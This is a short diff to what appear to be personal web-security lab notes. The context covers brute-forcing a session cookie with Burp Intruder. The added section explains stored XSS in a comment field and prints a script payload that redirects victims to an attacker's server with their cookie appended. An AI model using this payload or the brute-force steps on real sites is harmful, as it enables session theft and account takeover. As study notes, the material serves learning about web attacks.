@@ -39,3 +39,13 @@ cookie : set-logged-session=somevalue1; session=somevalue2;
 pass this to intruder by cookie : set-logged-session=$somevalue1$; session= (as session will be setted by itself)
 
 In intruder paste password in payloads and apply rules as per the encrypted formula. And start the attack
+
+## XSS attack in common webpages of a web-app to fetch cookie
+
+Attacker and victim, share same webpage with xss vulnerability. Each user have separate server to view their log. Attacker can post in xss comments attack like <script>
+
+```bash
+<script>document.location="attacker's server ip"+document.cookie</script>
+```
+
+When victim go through this attack, his cookie will be stored in attacker’s server.
